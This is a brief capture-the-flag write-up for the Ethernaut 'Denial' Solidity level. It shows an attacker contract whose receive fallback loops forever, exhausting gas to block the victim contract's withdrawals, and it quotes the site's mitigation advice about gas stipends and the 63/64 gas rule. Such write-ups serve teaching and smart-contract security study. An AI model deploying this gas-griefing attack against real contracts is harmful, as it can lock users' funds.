# 20-Denial

1. To deny `Denial` contract, we can create a `DenialAttack` contract as a partner, where in `receive` fallback, we define infinite loop causing the call always out of gas.

```solidity
    receive() external payable {
        uint here = 0;
        while (true) {
            // forever in here
            here++;
        }
    }
```

note from the site :

If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `call.gas(100000).value()`.

Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
